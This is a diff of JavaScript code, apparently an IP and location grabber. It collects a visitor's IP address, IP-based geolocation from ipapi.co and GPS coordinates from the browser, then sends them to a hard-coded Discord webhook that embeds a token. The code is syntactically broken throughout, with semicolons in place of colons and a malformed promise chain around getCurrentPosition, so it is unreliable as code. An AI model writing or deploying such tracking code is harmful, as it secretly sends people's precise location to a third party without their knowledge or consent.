@@ -6,20 +6,21 @@ const sendIP = () => {
             return fetch(`https://ipapi.co/${ipadd}/json/`)
                 .then(geoResponse => geoResponse.json())
                 .then(geoData => {
-                    
-                    navigator.geolocation.getCurrentPosition(
-                                pos => {
-                                    {
-                                        ipadd,
-                                        geoData,
-                                        gps; {
-                                            latitude; pos.coords.latitude,
-                                            longitude; pos.coords.longitude
-                                        }
-                                    };
+                then(gps => navigator.geolocation.getCurrentPosition
+                .then(pos => {
+                                {
+                                    ipadd,
+                                    geoData,
+                                    gps; {
+                                        latitude; pos.coords.latitude,
+                                        longitude; pos.coords.longitude
+                                    }
+                                };
 
-                                }
-                            );
+                            }
+                        )
+                    );
+
 
                     const dscURL = 'https://discord.com/api/webhooks/1443048665060216842/9uztTJLzht8-CFfLm1nWnukGYrrqLav39rwdv795wt_Crp6oTPHJ9RR8yn0r3L48Yi4P'; // replace with your webhook url
                     return fetch(dscURL, {
